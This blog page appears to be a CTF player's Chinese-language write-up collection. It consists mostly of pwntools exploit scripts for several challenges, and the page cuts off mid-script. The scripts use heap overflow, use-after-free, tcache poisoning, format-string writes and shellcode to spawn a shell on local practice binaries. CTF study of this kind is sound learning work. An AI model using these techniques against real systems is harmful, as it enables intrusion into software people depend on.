<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-2019-10-05-goods" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/05/2019-10-05-goods/" class="article-date">
  <time class="dt-published" datetime="2019-10-04T16:00:00.000Z" itemprop="datePublished">2019-10-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/05/2019-10-05-goods/">Some interesting exercises</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="第五空间-线下赛"><a href="#第五空间-线下赛" class="headerlink" title="第五空间 线下赛"></a>第五空间 线下赛</h1><h2 id="壹業"><a href="#壹業" class="headerlink" title="壹業"></a>壹業</h2><p>这个和 0ctf 的 babyheap 挺像的,很简单,但是本地的 so 文件的 one_gadegt 不太好用,本地调不通,很难受,感觉远程可以,应该不用调堆栈吧~~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[8:56:33] pic:壹業 $ one_gadget libc.so.6 </span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">r=process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    r.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">    r.sendline(&#x27;1&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">def show(idx):</span><br><span class="line">    r.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">    r.sendline(&#x27;2&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">def edit(idx,cont):</span><br><span class="line">    r.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">    r.sendline(&#x27;3&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line">def delete(idx):</span><br><span class="line">    r.recvuntil(&#x27;&gt;&gt;&#x27;)</span><br><span class="line">    r.sendline(&#x27;4&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(0x60)#0</span><br><span class="line">add(0x60)#1</span><br><span class="line">add(0x60)#2</span><br><span class="line">add(0xa0)#3</span><br><span class="line">add(0x60)#4</span><br><span class="line">add(0x60)#5</span><br><span class="line">delete(3)</span><br><span class="line">show(3)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">leak=u64(r.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">success(hex(leak))</span><br><span class="line">mallochook=leak-0x68</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lbase=leak-0x3c4b78</span><br><span class="line">one=lbase+0xf1147</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(mallochook-0x23))</span><br><span class="line"></span><br><span class="line">add(0x60)#6</span><br><span class="line">add(0x60)#7</span><br><span class="line">edit(7,&#x27;z&#x27;*0x13+p64(one))</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">add(0x30)#8</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="三學"><a href="#三學" class="headerlink" title="三學"></a>三學</h2><p>输入溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./pwn3x&#x27;)</span><br><span class="line"></span><br><span class="line">sys=0x8048440</span><br><span class="line">sh=0x804a04c</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(&#x27;/bin/sh\0&#x27;)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(&#x27;1&#x27;)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(&#x27;-1&#x27;)</span><br><span class="line">r.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">r.sendline(&#x27;a&#x27;*96+p32(sys)+p32(0)+p32(sh))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="四諦"><a href="#四諦" class="headerlink" title="四諦"></a>四諦</h2><p>第一次接触到这种必须分析数据结构的堆,简单记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">r= process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def addnote(size,content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">def delnote(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">def printnote(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">got_puts=0x804c024</span><br><span class="line">func=0x80491f2</span><br><span class="line"></span><br><span class="line">addnote(32,&quot;0&quot;*4)#0</span><br><span class="line">addnote(32,&quot;1&quot;*4)#1</span><br><span class="line">addnote(32,&quot;2&quot;*4)#2</span><br><span class="line">delnote(0)</span><br><span class="line">delnote(1)</span><br><span class="line">addnote(8,p32(func)+p32(got_puts))#3</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">printnote(0)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">puts=u32(r.recv(4))</span><br><span class="line">success(hex(puts))</span><br><span class="line">sys=puts-libc.symbols[&#x27;puts&#x27;]+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">delnote(3)</span><br><span class="line">addnote(8,p32(sys)+&#x27;;sh&#x27;)#4</span><br><span class="line">printnote(0)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="五蘊"><a href="#五蘊" class="headerlink" title="五蘊"></a>五蘊</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./pwn5x&#x27;)</span><br><span class="line"></span><br><span class="line">target=0x804c044</span><br><span class="line">pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="LCTF-2018"><a href="#LCTF-2018" class="headerlink" title="LCTF 2018"></a>LCTF 2018</h1><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p>第一次做 tcache 的题，看 wp 愣是看了一天才明白，中间换了好几个，实在不好理解，摘抄自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c38ddde33ac9">大佬</a>，就不给大佬改了，中间加了点容易理解的注释，不知道大家能不能看懂，算了，直接在 wp 里解释一波，怕自己也忘了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def new(size,note):</span><br><span class="line">  p.recvuntil(&quot;?\n&gt; &quot;)</span><br><span class="line">  p.sendline(&quot;1&quot;)</span><br><span class="line">  p.recvuntil(&quot;size \n&gt; &quot;)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(&quot;content \n&gt; &quot;)</span><br><span class="line">  if size==0:#新方式，拿本本记下来</span><br><span class="line">    return</span><br><span class="line">  else:</span><br><span class="line">     p.send(note)</span><br><span class="line">def delete(index):</span><br><span class="line">  p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">  p.sendline(&quot;2&quot;)</span><br><span class="line">  p.recvuntil(&quot;index \n&gt; &quot;)</span><br><span class="line">  p.sendline(str(index))</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">p=process(&quot;./easy_heap&quot;)</span><br><span class="line">for i in range(10):</span><br><span class="line">   new(0,&quot;kirin\n&quot;)</span><br><span class="line">#make unsorted bin</span><br><span class="line">for i in range(5):</span><br><span class="line">  delete(9-i)#9 8 7 6 5</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">#tcache full!(1-&gt;3-&gt;5-&gt;6-&gt;7-&gt;8-&gt;9)</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">delete(0)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">#700-&gt;300-&gt;500(unsortedbin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    new(0,&quot;kirin\n&quot;)</span><br><span class="line"># new 0~6 400 600 800 900 a00 b00 c00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0,&quot;kirin\n&quot;)#700 7</span><br><span class="line">new(0xf8,&quot;\x00&quot;)#300 8   off by one</span><br><span class="line">new(0,&quot;kirin\n&quot;)#500 9</span><br><span class="line">for i in range(6):#free 1~6</span><br><span class="line">  delete(i+1)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">500-&gt;c10 -&gt; b10 - a10 - 910 - 810- 610</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">delete(9)#500</span><br><span class="line">delete(0)#400，合并了，赛高</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#leak</span><br><span class="line">p.recvuntil(&quot;?\n&gt; &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;index \n&gt; &quot;)</span><br><span class="line">p.sendline(&quot;8&quot;)</span><br><span class="line">s=p.recv(6)</span><br><span class="line">libc_addr=u64(s.ljust(8,&quot;\x00&quot;))-0x3ebca0</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">#leak over hahaa</span><br><span class="line">#7 8 used</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">  new(0,&quot;kirin\n&quot;)</span><br><span class="line">#1   2   3   4   5   6   9</span><br><span class="line">#500 c10 b10 a10 910 810 610</span><br><span class="line">delete(8)</span><br><span class="line">delete(9)</span><br><span class="line">#tcache</span><br><span class="line">#610-&gt;300</span><br><span class="line">new(0x10,p64(libc_addr+0x3ebc30))#malloc_hook</span><br><span class="line">new(0x10,&quot;kirin\n&quot;)</span><br><span class="line">for i in range(8):</span><br><span class="line">   delete(i)#最后一次返回 malloc</span><br><span class="line">for i in range(8):</span><br><span class="line">   new(0x10,p64(libc_addr+0x10a38c))#one_gadegt</span><br><span class="line">delete(0)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉 tcache 很难构造啊，还得多看源码和调试</p>
<h2 id="1007"><a href="#1007" class="headerlink" title="1007"></a>1007</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./1007&#x27;)</span><br><span class="line">r.sendlineafter(&#x27;:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">r.sendlineafter(&#x27;?\n&#x27;,&#x27;a&#x27;*0x28+p64(0x12345678))</span><br><span class="line">r.sendlineafter(&#x27;:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">r.recvuntil(&#x27;[&#x27;)</span><br><span class="line">addr = int(r.recvuntil(&#x27;]&#x27;)[:-1],16)</span><br><span class="line">r.sendlineafter(&#x27;:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">shellcode = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">a = shellcode.ljust(0x38,&#x27;\x00&#x27;)</span><br><span class="line">r.sendlineafter(&#x27;?\n&#x27;,a+p64(addr))</span><br><span class="line">r.sendlineafter(&#x27;:\n&#x27;,&#x27;aa&#x27;)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>在这里有两个奇怪的点</p>
<ul>
<li>为啥送 payload 的时候<code>r.sendlineafter(&#39;?\n&#39;,a+p64(addr+0x40)+a)</code>失败了</li>
<li><code>asm(shellcraft.sh())</code>等一堆 shellcode 都不好用，为啥呢</li>
</ul>
<h1 id="铁人三项"><a href="#铁人三项" class="headerlink" title="铁人三项"></a>铁人三项</h1><h2 id="littlenote"><a href="#littlenote" class="headerlink" title="littlenote"></a>littlenote</h2><blockquote>
<p>UAF</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./littlenote&#x27;)</span><br><span class="line">def add(content):</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.sendafter(&#x27;e\n&#x27;,content)</span><br><span class="line">    io.sendlineafter(&#x27;?\n&#x27;,&#x27;Y&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">def show(index):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;?\n&#x27;,str(index))</span><br><span class="line">    return (io.recvuntil(&quot;\n&quot;))[:-1]</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;?\n&#x27;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(&#x27;Done\n&#x27;)</span><br><span class="line"></span><br><span class="line">add(&#x27;\x00&#x27;*0x58+p64(0x71))</span><br><span class="line">add(&#x27;1&#x27;)</span><br><span class="line">add(p64(0x0)*5+p64(0x41))#bypass</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">heap_base=u64((show(0)).ljust(8,&#x27;\x00&#x27;))-0x70</span><br><span class="line">print &quot;heap_base -&gt; &quot; + hex(heap_base)</span><br><span class="line">add(p64(heap_base+0x60))</span><br><span class="line">add(&#x27;1&#x27;)</span><br><span class="line">add(&#x27;1&#x27;)</span><br><span class="line">add(&#x27;\x00&#x27;*8+p64(0xA1))</span><br><span class="line">free(1)</span><br><span class="line">libc_base=u64((show(1)).ljust(8,&#x27;\x00&#x27;))-0x3C4B78</span><br><span class="line">print &quot;libc_base -&gt; &quot; + hex(libc_base)</span><br><span class="line">one_gadget=libc_base+0xf02a4</span><br><span class="line">print &quot;one_gadget -&gt; &quot; + hex(one_gadget)</span><br><span class="line">add(&#x27;7&#x27;) # 7</span><br><span class="line">add(&#x27;8&#x27;) # 8</span><br><span class="line">add(&#x27;9&#x27;) # 9</span><br><span class="line">free(7)</span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line">point=libc_base+0x3c4af5-8</span><br><span class="line">print &quot;point -&gt; &quot; +hex(point) </span><br><span class="line">add(p64(point)) # 10</span><br><span class="line">add(&#x27;b&#x27;) # 11</span><br><span class="line">add(&#x27;c&#x27;) # 12</span><br><span class="line">add(&#x27;a&#x27;*19+p64(one_gadget))</span><br><span class="line">io.sendline(&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这题比较恶心,只能构造一个单位长度的 chunk ,不过还好洞很严重, 2333 . UAF 实在太恐怖了</p>
<h2 id="bookstore"><a href="#bookstore" class="headerlink" title="bookstore"></a>bookstore</h2><blockquote>
<p>堆溢出</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">env=os.environ</span><br><span class="line">#env[&#x27;LD_PRELOAD&#x27;]=&#x27;./libc_64.so&#x27;</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./bookstore&#x27;)</span><br><span class="line">def add(author,size,cont):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;1&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;What is the author name?&#x27;)</span><br><span class="line">    r.sendline(author)</span><br><span class="line">    r.recvuntil(&#x27;How long is the book name?&#x27;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&#x27;What is the name of the book?&#x27;)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line">def delete(idx):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;2&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;?&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;3&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;?&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">add(&#x27;a&#x27;*0x10,0,&#x27;0&#x27;*0x10)#0</span><br><span class="line">add(&#x27;b&#x27;*0x10,0x40,&#x27;1&#x27;*0x10)#1</span><br><span class="line">add(&#x27;c&#x27;*0x10,0x40,&#x27;2&#x27;*0x10)#2</span><br><span class="line">add(&#x27;d&#x27;*0x10,0x40,&#x27;3&#x27;*0x10)#3</span><br><span class="line">delete(0)</span><br><span class="line">add(&#x27;a&#x27;*0x10,0,&#x27;0&#x27;*0x18+p64(0xa1))#0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(&#x27;b&#x27;,0,&#x27;1&#x27;*1)#1</span><br><span class="line">show(1)</span><br><span class="line">r.recvuntil(&#x27;\x65\x3a&#x27;)</span><br><span class="line">lleak=u64(r.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &quot;lleak:&quot;+hex(lleak)</span><br><span class="line">lbase=lleak-0x3c4c31</span><br><span class="line">sys=lbase+0x45390</span><br><span class="line">sh=lbase+0x18cd57</span><br><span class="line">iolistall=lbase+0x3c5520</span><br><span 